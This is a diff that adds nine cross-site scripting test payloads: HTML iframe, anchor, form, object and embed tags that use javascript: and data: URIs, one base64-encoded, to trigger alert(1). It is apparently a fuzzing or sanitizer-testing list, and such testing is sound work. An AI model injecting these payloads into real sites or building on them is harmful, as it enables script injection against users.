@@ -1,0 +1,9 @@
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<a href="javascript:alert(1)">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg==">
+<form action="javascript:alert(1)"><button>send</button></form>
+<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
